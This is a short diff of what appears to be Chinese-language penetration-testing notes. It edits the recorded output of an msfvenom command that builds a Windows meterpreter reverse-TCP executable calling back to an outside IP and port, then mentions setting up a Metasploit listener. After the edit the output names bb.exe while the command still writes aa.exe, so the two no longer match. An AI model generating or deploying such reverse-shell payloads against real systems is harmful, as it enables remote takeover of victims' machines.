@@ -66,10 +66,11 @@ Windows 目录:     C:\Windows
 $ msfvenom -p windows/meterpreter/reverse_tcp -e x86 LHOST=114.115.123.123 LPORT=8888 -f exe -o aa.exe
 No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 No Arch selected, selecting Arch: x86 from the payload
+Skipping invalid encoder x86
 No encoder or badchars specified, outputting raw payload
-Payload size: 333 bytes
+Payload size: 341 bytes
 Final size of exe file: 73802 bytes
-Saved as: aa.exe
+Saved as: bb.exe
 ```
 msf监听，等待payload执行
 ```
